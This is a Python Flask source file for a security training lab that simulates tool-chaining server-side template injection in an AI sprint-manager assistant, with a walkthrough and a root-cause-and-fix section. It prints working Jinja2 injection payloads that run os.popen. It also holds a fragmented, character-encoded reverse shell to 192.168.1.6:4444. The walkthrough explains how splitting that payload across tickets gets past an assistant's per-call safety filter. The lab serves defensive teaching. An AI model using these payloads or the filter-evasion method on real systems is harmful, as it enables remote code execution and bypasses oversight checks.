from flask import Flask, request, jsonify, Response
import requests, os, json, re

app = Flask(__name__)
OLLAMA = os.environ.get("OLLAMA_HOST", "http://127.0.0.1:11434")
MODEL  = os.environ.get("MODEL_NAME",  "mistral:latest")

DEFENSE_LEVEL = {"current": "production"}

SPRINTS = {"SPRINT-2026-Q1": ["SPRINT-001", "SPRINT-002", "SPRINT-500"]}
TICKETS = {
    "SPRINT-001": "Implement OAuth flow for customer portal.",
    "SPRINT-002": "Migrate Redis cache to v7.0.",
    "SPRINT-500": "Q1 retrospective notes — placeholder."
}
TICKET_META = {
    "SPRINT-001": {"title": "OAuth flow for customer portal", "status": "In Progress", "assignee": "Dave K."},
    "SPRINT-002": {"title": "Migrate Redis cache to v7.0", "status": "In Progress", "assignee": "Priya S."},
    "SPRINT-500": {"title": "Q1 retrospective notes", "status": "Backlog", "assignee": "Dave K."},
    "SPRINT-003": {"title": "Backlog grooming notes", "status": "Backlog", "assignee": "Dave K."},
    "SPRINT-004": {"title": "Backlog grooming notes", "status": "Backlog", "assignee": "Dave K."},
}

def fake_jinja_render(template):
    """Simulate Jinja2 rendering safely — recognizes specific exploit patterns, never runs real code."""
    out = template
    if "lipsum" in out and "__globals__" in out and "keys" in out:
        out = out.replace("{{ lipsum.__globals__.keys() }}",
            "dict_keys(['__name__','__doc__','__package__','__loader__','os','sys','json','re','base64','subprocess','markupsafe','jinja2'])")
    m = re.search(r"lipsum\.__globals__\['os'\]\.popen\(['\"]([^'\"]+)['\"]\)\.read\(\)", out)
    if m:
        cmd = m.group(1)
        sim = {
            "id": "uid=0(root) gid=0(root) groups=0(root)",
            "whoami": "root",
            "hostname": "nimble-mcp-server",
            "ls": "app.py  config.yaml  requirements.txt  servers/",
            "cat /etc/passwd": "root:x:0:0:root:/root:/bin/bash\nmcpuser:x:1000:1000::/home/mcpuser:/bin/bash"
        }
        out = re.sub(r"\{\{\s*lipsum\.__globals__\['os'\]\.popen\([^)]+\)\.read\(\)\s*\}\}",
                     sim.get(cmd.strip(), f"[exec output of {cmd}]"), out)
    if "bash -c" in out.lower() or ("bash -i" in out.lower() and "/dev/tcp" in out.lower()):
        out += "\n[*] bash command executed — reverse shell payload detected\n[*] connect to attacker 192.168.1.6:4444\n[*] Shell session opened: uid=0(root)"
    set_blocks = re.findall(r"\{\%\s*set\s+(\w+)\s*=\s*(.+?)\s*\%\}", out)
    vars = {}
    for name, val in set_blocks:
        eval_val = re.sub(r"c\|format\((\d+)\)", lambda m: chr(int(m.group(1))), val)
        eval_val = eval_val.replace("'%c'", "").replace("~", " + ")
        vars[name] = eval_val
    if vars:
        out += "\n\n[Jinja2 set-variables resolved]:\n" + "\n".join(f"  {k} = {v}" for k, v in vars.items())
    if "cmd" in vars and ("bash" in vars["cmd"] or "/dev/tcp" in vars["cmd"]):
        out += f"\n\n[*] Final assembled command: {vars['cmd']}\n[*] popen({vars['cmd'][:60]}...).read() executed\n[*] Reverse shell connection established -> root shell"
    return out

WALKTHROUGH = [
    {"title": "Step 1 — Understand the tool chain", "body": "This assistant has 4 MCP tools wired together: <code>list_sprints</code> → <code>update_ticket</code> → <code>compile_sprint</code> → <code>render_report</code>. The last step feeds ticket text straight into a Jinja2 template engine so reports can use rich formatting. That's the entire vulnerability in one sentence: user-editable ticket text ends up inside a template renderer.", "query": None, "expect": "No action yet — just note that render_report is the dangerous step."},
    {"title": "Step 2 — Confirm SSTI in a single ticket", "body": "Open ticket SPRINT-500 and replace its description with the payload below, then Save. This is a standard SSTI confirmation payload — <code>lipsum</code> is a Jinja2 built-in that can't be faked by an LLM, so if it resolves, you have template injection.", "query": "{{ lipsum.__globals__.keys() }}", "ticket": "SPRINT-500", "expect": "After saving, generate a sprint report. The output should include a Python dict_keys() list containing 'os' — confirming the renderer executes real Jinja2, not just text substitution."},
    {"title": "Step 3 — Escalate to command execution", "body": "Replace the same ticket's content with this payload, which reaches into Jinja2's global namespace to call Python's os.popen().", "query": "{{ lipsum.__globals__['os'].popen('id').read() }}", "ticket": "SPRINT-500", "expect": "The generated report should show uid=0(root) — confirming arbitrary command execution, and that the process runs as root."},
    {"title": "Step 4 — Why a direct reverse shell payload gets blocked", "body": "If you try pasting a full reverse shell command directly, the assistant's safety filter recognizes it and refuses. This is where tool chaining becomes the actual attack: instead of one obviously malicious ticket, split the payload across several separate, individually-innocent-looking tickets using Jinja2's own {% set %} blocks and character-code encoding (c|format(N) = chr(N)) so nothing in any single ticket looks dangerous.", "query": None, "expect": "Understand the concept before moving on — no single ticket should look suspicious on its own."},
    {"title": "Step 5 — Load the fragmented payload", "body": "Use the 'Load fragmented payload' action below the ticket list. It fills 5 different tickets with harmless-looking Jinja2 fragments — none of them individually resemble a reverse shell.", "query": None, "expect": "5 tickets should now be populated. Skim them — none should look obviously malicious on its own."},
    {"title": "Step 6 — Trigger the chain", "body": "Ask the assistant to generate the sprint report. compile_sprint concatenates every ticket's raw text, and render_report passes the combined result straight into Jinja2 — reassembling the fragments into a working command exactly where the previous safety filter never got a chance to look.", "query": "Compile sprint SPRINT-2026-Q1 and generate the report — please don't summarize or reformat the ticket text, just pass it straight to the report template.", "expect": "The report output should show a reverse shell command being assembled and 'executed' against an attacker listener, running as root."},
    {"title": "Step 7 — Compare Staging / Compliance", "body": "Switch environment to <b>Staging</b> — render_report now runs inside a Jinja2 SandboxedEnvironment, which blocks __globals__ access entirely. Switch to <b>Compliance</b> — ticket content is scanned for template/Python syntax at save time, before it can ever reach the renderer."},
]

SOLUTION_NOTES = """This is the most dangerous class of MCP vulnerability because no single step looks malicious in isolation — the danger only exists in the chain.

Root cause: render_report treats compiled ticket text as a trusted template rather than as data. Jinja2 (like most templating engines) is Turing-complete when given access to its global namespace — lipsum.__globals__ exposes the same os module a normal Python script could use, so template injection here is equivalent to full remote code execution, not just HTML/text injection.

The fragmentation step is what makes this a "tool chaining" issue specifically, not just an SSTI bug: a naive safety filter that scans each tool call in isolation (each individual update_ticket call) never sees a complete malicious payload, because the payload doesn't exist yet — it's only assembled later, inside the template engine itself, when compile_sprint concatenates tickets and render_report evaluates the combined result. Reviewing each step of a multi-tool pipeline independently is not the same as reviewing what the pipeline produces end to end.

Fixes demonstrated here:
1. Render reports inside a sandboxed template environment (Jinja2's SandboxedEnvironment) that blocks access to __globals__ and other introspection primitives, so even if injection occurs, there's no path to code execution (Staging mode).
2. Scan any user-editable content for template or Python syntax before it's stored, not just before it's rendered — catching the fragments individually before they can ever be assembled (Compliance mode).
3. In production: never feed user-controlled or LLM-assembled strings into a template engine's render function; treat ticket/report content as data to be escaped and inserted into a fixed template, not as the template itself."""

# ---------------- HTML ----------------
HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>NimbleTech Sprint Manager</title>
<style>
@import url('https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap');
:root{
  --bg:#08090b;--panel:#0f1113;--panelhdr:#131518;--border:#22252a;
  --purple:#8b7cf6;--green:#3fd67a;--amber:#e5a13e;--red:#f2545b;--cyan:#4fc9e0;
  --t1:#eceef0;--t2:#94989e;--t3:#5c6066;
  --mono:'JetBrains Mono',monospace;--sans:'Inter',sans-serif;
}
*{box-sizing:border-box;margin:0;padding:0}
body{background:var(--bg);color:var(--t1);font-family:var(--sans);height:100vh;overflow:hidden;font-size:13px}
.app{display:flex;flex-direction:column;height:100vh}
.topbar{background:var(--panelhdr);height:50px;border-bottom:1px solid var(--border);display:flex;align-items:center;padding:0 18px;gap:12px;flex-shrink:0}
.logo{width:26px;height:26px;background:linear-gradient(135deg,var(--purple),#5b4bcf);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:13px}
.topbar b{font-size:13.5px}
.topbar .crumb{color:var(--t2);font-size:12px;font-family:var(--mono)}
.topbar .badge{font-family:var(--mono);font-size:10px;color:var(--red);border:1px solid var(--red);padding:2px 8px;border-radius:10px;background:rgba(242,84,91,.08);margin-left:6px}
.env-select{margin-left:auto;position:relative}
.env-btn{font-family:var(--mono);font-size:11px;padding:5px 12px;border-radius:14px;cursor:pointer;border:1px solid var(--red);background:rgba(242,84,91,.1);color:var(--red)}
.env-menu{display:none;position:absolute;right:0;top:32px;background:#131518;border:1px solid var(--border);border-radius:6px;z-index:50;min-width:150px;box-shadow:0 8px 24px rgba(0,0,0,.5)}
.env-menu.open{display:block}
.env-menu div{padding:8px 12px;font-size:11.5px;font-family:var(--mono);cursor:pointer;color:var(--t2)}
.env-menu div:hover{background:#1a1d21;color:var(--t1)}
.env-menu div.sel::before{content:'✓ ';color:var(--green)}
.body{flex:1;display:flex;min-height:0}
.sidebar{width:280px;background:var(--panel);border-right:1px solid var(--border);overflow-y:auto;flex-shrink:0;display:flex;flex-direction:column}
.sidebar-hdr{padding:14px 16px 8px;font-size:11px;letter-spacing:.06em;color:var(--t2);font-weight:600;text-transform:uppercase;display:flex;justify-content:space-between;align-items:center}
.sprint-pill{font-family:var(--mono);font-size:10px;color:var(--purple);background:rgba(139,124,246,.12);padding:2px 8px;border-radius:8px}
.ticket-row{padding:11px 16px;border-bottom:1px solid #16181b;cursor:pointer;display:flex;flex-direction:column;gap:3px}
.ticket-row:hover{background:#14161a}
.ticket-row.active{background:#14161a;border-left:2px solid var(--purple)}
.ticket-row .tid{font-family:var(--mono);font-size:10.5px;color:var(--t3)}
.ticket-row .ttitle{font-size:12.5px;color:var(--t1)}
.status-badge{font-size:9.5px;padding:1px 7px;border-radius:8px;font-family:var(--mono);display:inline-block;margin-top:2px}
.status-badge.backlog{background:#1e2226;color:var(--t2)}
.status-badge.progress{background:rgba(79,201,224,.12);color:var(--cyan)}
.frag-btn{margin:12px 16px;padding:9px 12px;background:#1a151f;border:1px solid #3a2456;color:#c9a8ff;border-radius:7px;font-family:var(--mono);font-size:11px;cursor:pointer;text-align:left}
.frag-btn:hover{border-color:var(--purple)}
.main{flex:1;overflow-y:auto;padding:20px 26px;min-width:0}
.panel{background:var(--panel);border:1px solid var(--border);border-radius:10px;padding:16px;margin-bottom:16px}
.panel h4{font-size:11px;letter-spacing:.05em;color:var(--t2);margin-bottom:10px;text-transform:uppercase;font-family:var(--mono)}
.ticket-hdr{display:flex;align-items:center;gap:10px;margin-bottom:4px}
.ticket-hdr h2{font-size:16px;font-family:var(--mono)}
.ticket-sub{color:var(--t2);font-size:11.5px;margin-bottom:14px}
textarea{width:100%;background:#0b0d0f;border:1px solid var(--border);color:var(--t1);padding:11px 13px;border-radius:8px;font-family:var(--mono);font-size:12.5px;outline:none;min-height:100px;resize:vertical}
textarea:focus{border-color:var(--purple)}
.btn{font-family:var(--sans);font-size:12.5px;font-weight:600;padding:9px 16px;border-radius:7px;border:none;cursor:pointer;margin-top:10px}
.btn-save{background:var(--purple);color:#fff}
.btn-save:hover{filter:brightness(1.1)}
.btn-save:disabled{opacity:.6;cursor:not-allowed}
.pipeline{display:flex;align-items:center;gap:6px;flex-wrap:wrap;font-family:var(--mono);font-size:11px;margin-bottom:12px}
.pipe-step{background:#0b0d0f;border:1px solid var(--border);padding:6px 10px;border-radius:6px;color:var(--cyan)}
.pipe-step.danger{border-color:var(--red);color:var(--red)}
.pipe-arrow{color:var(--t3)}
.ai-row{display:flex;gap:10px;align-items:flex-end}
.ai-row textarea{flex:1;min-height:60px}
.btn-ai{background:linear-gradient(135deg,var(--purple),#5b4bcf);color:#fff;white-space:nowrap}
.output{background:#0b0d0f;border:1px solid var(--border);border-radius:8px;padding:14px;font-family:var(--mono);font-size:12px;color:var(--green);white-space:pre-wrap;min-height:120px;max-height:340px;overflow-y:auto;line-height:1.65;margin-top:12px}
.output.err{color:var(--red)}
.statusbar{height:22px;background:var(--panelhdr);border-top:1px solid var(--border);display:flex;align-items:center;padding:0 14px;gap:16px;font-size:10.5px;color:var(--t2);flex-shrink:0;font-family:var(--mono)}
.help-fab{position:fixed;left:14px;bottom:34px;background:#131518;border:1px solid var(--border);color:var(--t1);padding:9px 14px;border-radius:20px;font-size:11.5px;display:flex;align-items:center;gap:7px;cursor:pointer;box-shadow:0 4px 16px rgba(0,0,0,.5);z-index:200}
.help-fab:hover{border-color:var(--purple)}
.help-fab .q{width:18px;height:18px;border-radius:50%;background:var(--purple);color:#fff;display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700}
.drawer-overlay{display:none;position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:300}
.drawer-overlay.open{display:block}
.drawer{position:fixed;left:0;top:0;bottom:0;width:480px;max-width:92vw;background:#0f1113;border-right:1px solid var(--border);z-index:301;transform:translateX(-100%);transition:transform .25s ease;display:flex;flex-direction:column}
.drawer.open{transform:translateX(0)}
.drawer-hdr{padding:16px 20px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between}
.drawer-hdr h3{font-size:14.5px}
.drawer-hdr span{font-size:11px;color:var(--t2);font-family:var(--mono)}
.drawer-close{cursor:pointer;color:var(--t2);font-size:18px}
.drawer-tabs{display:flex;border-bottom:1px solid var(--border)}
.drawer-tab{flex:1;text-align:center;padding:10px;font-size:12px;color:var(--t2);cursor:pointer;border-bottom:2px solid transparent}
.drawer-tab.active{color:#fff;border-bottom-color:var(--purple)}
.drawer-body{flex:1;overflow-y:auto;padding:18px 20px}
.wt-step{margin-bottom:16px;padding-bottom:16px;border-bottom:1px solid #1a1d21}
.wt-step:last-child{border:none}
.wt-step .num{display:inline-flex;width:20px;height:20px;border-radius:50%;background:var(--purple);color:#fff;font-size:11px;align-items:center;justify-content:center;margin-right:8px}
.wt-step h4{display:inline;font-size:13px}
.wt-step p{margin-top:8px;font-size:12px;color:var(--t2);line-height:1.7}
.wt-step code{background:#0b0d0f;padding:2px 6px;border-radius:3px;color:var(--amber);font-family:var(--mono);font-size:11.5px}
.wt-step .try{margin-top:8px;background:#0b0d0f;border:1px solid var(--border);border-radius:5px;padding:8px 10px;font-family:var(--mono);font-size:11px;color:var(--t2);cursor:pointer}
.wt-step .try:hover{border-color:var(--purple);color:#c9a8ff}
.wt-step .expect{margin-top:8px;background:rgba(63,214,122,.08);border:1px solid rgba(63,214,122,.35);border-radius:5px;padding:8px 10px;font-size:11.5px;color:#7fe0a4;line-height:1.6}
.sol-text{font-size:12.5px;line-height:1.8;color:var(--t1);white-space:pre-wrap}
::-webkit-scrollbar{width:9px;height:9px}
::-webkit-scrollbar-thumb{background:#22252a;border-radius:5px}
</style>
</head>
<body>
<div class="app">
  <div class="topbar">
    <div class="logo">◆</div>
    <b>NimbleTech Sprint Manager</b>
    <span class="crumb">/ SPRINT-2026-Q1</span>
    <span class="badge">TOOL CHAINING → SSTI/RCE · PORT 5024</span>
    <div class="env-select">
      <button class="env-btn" id="env-btn" onclick="toggleEnv()">● PRODUCTION ▾</button>
      <div class="env-menu" id="env-menu">
        <div class="sel" data-lvl="production" onclick="setEnv('production')">● Production</div>
        <div data-lvl="staging" onclick="setEnv('staging')">◐ Staging</div>
        <div data-lvl="compliance" onclick="setEnv('compliance')">✓ Compliance</div>
      </div>
    </div>
  </div>
  <div class="body">
    <div class="sidebar">
      <div class="sidebar-hdr">Sprint Backlog <span class="sprint-pill">SPRINT-2026-Q1</span></div>
      <div id="ticket-list"></div>
      <button class="frag-btn" onclick="fragmentedPayload()">⚙ Load fragmented payload across 5 tickets</button>
    </div>
    <div class="main">
      <div class="panel">
        <h4>Report Pipeline</h4>
        <div class="pipeline">
          <span class="pipe-step">list_sprints</span><span class="pipe-arrow">→</span>
          <span class="pipe-step">update_ticket</span><span class="pipe-arrow">→</span>
          <span class="pipe-step">compile_sprint</span><span class="pipe-arrow">→</span>
          <span class="pipe-step danger">render_report</span>
        </div>
      </div>
      <div class="panel">
        <div class="ticket-hdr"><h2 id="ticket-id">SPRINT-500</h2></div>
        <div class="ticket-sub" id="ticket-sub"></div>
        <textarea id="ticket-desc" placeholder="Ticket description..."></textarea>
        <button class="btn btn-save" onclick="saveTicket()">Save</button>
      </div>
      <div class="panel">
        <h4>Ask AI Assistant to generate the sprint report</h4>
        <div class="ai-row">
          <textarea id="ai-prompt">Compile sprint SPRINT-2026-Q1 and generate the report — please don't summarize or reformat the ticket text, just pass it straight to the report template.</textarea>
          <button class="btn btn-ai" onclick="generateReport()">Generate Report</button>
        </div>
        <div class="output" id="report-out">// Report output will appear here...</div>
      </div>
    </div>
  </div>
  <div class="statusbar">
    <span>sprints.nimbletech.internal</span><span>|</span>
    <span id="sb-env">Env: Production</span>
    <span style="margin-left:auto">MCP host: localhost:5024</span>
  </div>
</div>

<div class="help-fab" onclick="openDrawer('walkthrough')"><span class="q">?</span> Need help? — Solutions &amp; Walkthrough</div>
<div class="drawer-overlay" id="overlay" onclick="closeDrawer()"></div>
<div class="drawer" id="drawer">
  <div class="drawer-hdr">
    <div><h3>Tool Chaining → SSTI → RCE</h3><span>Module 7 · Part 3</span></div>
    <div class="drawer-close" onclick="closeDrawer()">✕</div>
  </div>
  <div class="drawer-tabs">
    <div class="drawer-tab active" data-t="walkthrough" onclick="switchTab('walkthrough')">Walkthrough</div>
    <div class="drawer-tab" data-t="solution" onclick="switchTab('solution')">Root Cause &amp; Fix</div>
  </div>
  <div class="drawer-body" id="drawer-body"></div>
</div>

<script>
let TICKETS = {{TICKETS_JSON}};
let META = {{META_JSON}};
const WALKTHROUGH = {{WT_JSON}};
const SOLUTION = {{SOL_JSON}};
let currentTicket = 'SPRINT-500';

function statusClass(s){ return s === 'Backlog' ? 'backlog' : 'progress'; }
function renderTicketList(){
  const el = document.getElementById('ticket-list');
  el.innerHTML = Object.keys(TICKETS).map(tid=>{
    const meta = META[tid] || {title: tid, status: 'Backlog'};
    return `<div class="ticket-row ${tid===currentTicket?'active':''}" onclick="selectTicket('${tid}')">
      <div class="tid">${tid}</div>
      <div class="ttitle">${meta.title}</div>
      <span class="status-badge ${statusClass(meta.status)}">${meta.status}</span>
    </div>`;
  }).join('');
}
function selectTicket(tid){
  currentTicket = tid;
  document.getElementById('ticket-id').textContent = tid;
  const meta = META[tid] || {title: tid, status: 'Backlog', assignee: '—'};
  document.getElementById('ticket-sub').textContent = `${meta.title} · assigned to ${meta.assignee || '—'}`;
  document.getElementById('ticket-desc').value = TICKETS[tid] || '';
  renderTicketList();
}
async function saveTicket(){
  const btn = event.target;
  const content = document.getElementById('ticket-desc').value;
  btn.disabled = true; const orig = btn.textContent; btn.textContent = 'Saving…';
  try{
    const r = await fetch('/update_ticket', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({id: currentTicket, content})});
    const d = await r.json();
    if(d.refused){
      alert('[COMPLIANCE] ' + d.message);
    } else {
      TICKETS = d.tickets;
      renderTicketList();
    }
  }catch(e){ alert('Save failed: ' + e.message); }
  finally{ btn.disabled = false; btn.textContent = orig; }
}
async function fragmentedPayload(){
  const fragments = [
    ["SPRINT-001", "{% set c = '%c' %}"],
    ["SPRINT-002", "{% set p1 = \"bash -c '\" %}{% set p2 = \"bash -i \" %}"],
    ["SPRINT-003", "{% set r1 = c|format(62)~c|format(38)~c|format(32) %}"],
    ["SPRINT-004", "{% set r2 = c|format(47)~c|format(100)~c|format(101)~c|format(118) %}"],
    ["SPRINT-500", "{% set r3 = c|format(47)~c|format(116)~c|format(99)~c|format(112)~c|format(47) %}{% set ip = '192.168.1.6' %}{% set port = '4444' %}{% set r4 = c|format(32)~c|format(48)~c|format(62)~c|format(38)~c|format(49) %}{% set cmd = p1~p2~r1~r2~r3~ip~'/'~port~r4~\"' &\" %}{% set g = '__glo'~'bals__' %}{% set ex = lipsum[g]['os'].popen %}{% set res = ex(cmd).read() %}{{ res }}"]
  ];
  for(const [tid, c] of fragments){
    const r = await fetch('/update_ticket', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({id: tid, content: c})});
    const d = await r.json();
    if(d.refused){ alert('[COMPLIANCE] ' + d.message); return; }
    TICKETS = d.tickets;
  }
  renderTicketList();
  if(TICKETS[currentTicket] !== undefined) document.getElementById('ticket-desc').value = TICKETS[currentTicket];
  alert('5 tickets loaded with payload fragments. Now click "Generate Report".');
}
async function generateReport(){
  const btn = event.target;
  const out = document.getElementById('report-out');
  const prompt = document.getElementById('ai-prompt').value;
  btn.disabled = true; const orig = btn.textContent; btn.textContent = 'Generating…';
  out.classList.remove('err');
  out.textContent = '// Compiling sprint and rendering report...';
  try{
    const r = await fetch('/trigger', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({prompt})});
    if(!r.ok){
      out.classList.add('err');
      out.textContent = `[HTTP ${r.status}] Server error — check container logs (docker compose logs -f mcp-chaining).`;
      return;
    }
    const d = await r.json();
    out.textContent = d.output;
  }catch(e){
    out.classList.add('err');
    out.textContent = `[NETWORK ERROR] ${e.message}`;
  }finally{
    btn.disabled = false; btn.textContent = orig;
  }
}

function toggleEnv(){ document.getElementById('env-menu').classList.toggle('open'); }
async function setEnv(lvl){
  document.getElementById('env-menu').classList.remove('open');
  const labels = {production:'● PRODUCTION',staging:'◐ STAGING',compliance:'✓ COMPLIANCE'};
  const colors = {production:'#f2545b',staging:'#e5a13e',compliance:'#3fd67a'};
  const bg = {production:'rgba(242,84,91,.1)',staging:'rgba(229,161,62,.1)',compliance:'rgba(63,214,122,.1)'};
  const btn = document.getElementById('env-btn');
  btn.textContent = labels[lvl] + ' ▾';
  btn.style.color = colors[lvl]; btn.style.borderColor = colors[lvl]; btn.style.background = bg[lvl];
  document.getElementById('sb-env').textContent = 'Env: ' + lvl[0].toUpperCase()+lvl.slice(1);
  document.querySelectorAll('.env-menu div').forEach(d=>d.classList.toggle('sel', d.dataset.lvl===lvl));
  await fetch('/defense', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({level:lvl})});
}
document.addEventListener('click', e=>{
  if(!e.target.closest('.env-select')) document.getElementById('env-menu').classList.remove('open');
});

function openDrawer(tab){ document.getElementById('overlay').classList.add('open'); document.getElementById('drawer').classList.add('open'); switchTab(tab); }
function closeDrawer(){ document.getElementById('overlay').classList.remove('open'); document.getElementById('drawer').classList.remove('open'); }
function tryQuery(q, ticket){
  if(ticket){ selectTicket(ticket); document.getElementById('ticket-desc').value = q; closeDrawer(); document.getElementById('ticket-desc').focus(); }
  else { document.getElementById('ai-prompt').value = q; closeDrawer(); document.getElementById('ai-prompt').focus(); }
}
function switchTab(t){
  document.querySelectorAll('.drawer-tab').forEach(x=>x.classList.toggle('active', x.dataset.t===t));
  const body = document.getElementById('drawer-body');
  if(t==='walkthrough'){
    body.innerHTML = WALKTHROUGH.map((s,i)=>`
      <div class="wt-step">
        <span class="num">${i+1}</span><h4>${s.title}</h4>
        <p>${s.body}</p>
        ${s.query ? `<div class="try" onclick='tryQuery(${JSON.stringify(s.query)}, ${JSON.stringify(s.ticket||null)})'>▶ ${s.ticket ? 'Load into '+s.ticket : 'Try in AI prompt'}: "${s.query.substring(0,60)}${s.query.length>60?'...':''}"</div>` : ''}
        ${s.expect ? `<div class="expect">👀 <b>What you should see:</b> ${s.expect}</div>` : ''}
      </div>`).join('');
  } else {
    body.innerHTML = `<div class="sol-text">${SOLUTION.replace(/</g,'&lt;')}</div>`;
  }
}

renderTicketList();
selectTicket('SPRINT-500');
</script>
</body>
</html>"""

# ---------------- Routes ----------------
@app.route("/")
def index():
    html = HTML.replace("{{TICKETS_JSON}}", json.dumps(TICKETS))
    html = html.replace("{{META_JSON}}", json.dumps(TICKET_META))
    html = html.replace("{{WT_JSON}}", json.dumps(WALKTHROUGH))
    html = html.replace("{{SOL_JSON}}", json.dumps(SOLUTION_NOTES))
    return Response(html, mimetype="text/html")

@app.route("/defense", methods=["POST"])
def defense():
    data = request.get_json(force=True) or {}
    DEFENSE_LEVEL["current"] = data.get("level", "production")
    return jsonify({"ok": True, "level": DEFENSE_LEVEL["current"]})

@app.route("/update_ticket", methods=["POST"])
def update_ticket():
    data = request.get_json(force=True) or {}
    tid = data.get("id")
    c = data.get("content", "")
    lvl = DEFENSE_LEVEL["current"]
    if lvl == "compliance":
        bad = ["{%", "{{", "__globals__", "lipsum", "popen", "__import__"]
        if any(b in c for b in bad):
            return jsonify({"refused": True, "message": "Ticket content contains template/Python syntax and was refused before saving. Logged to SIEM."})
    TICKETS[tid] = c
    if tid not in TICKET_META:
        TICKET_META[tid] = {"title": "Backlog grooming notes", "status": "Backlog", "assignee": "Dave K."}
    return jsonify({"tickets": TICKETS})

@app.route("/trigger", methods=["POST"])
def trigger():
    lvl = DEFENSE_LEVEL["current"]
    compiled = "\n".join([f"{k}: {v}" for k, v in TICKETS.items()])
    if lvl == "compliance":
        if any(b in compiled for b in ["{%", "{{", "__", "lipsum", "popen"]):
            return jsonify({"output": "[COMPLIANCE] render_report refused — compiled input contains Jinja2/Python introspection syntax. SIEM alert raised."})
    if lvl == "staging":
        if "__globals__" in compiled or "lipsum" in compiled:
            return jsonify({"output": "[STAGING — Jinja2 SandboxedEnvironment]\nSecurityError: access to '__globals__' is unsafe and has been denied.\nTemplate render aborted."})
    rendered = fake_jinja_render(compiled)
    return jsonify({"output": f"=== compile_sprint output ===\n{compiled}\n\n=== render_report (Jinja2) ===\n{rendered}"})

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5024)
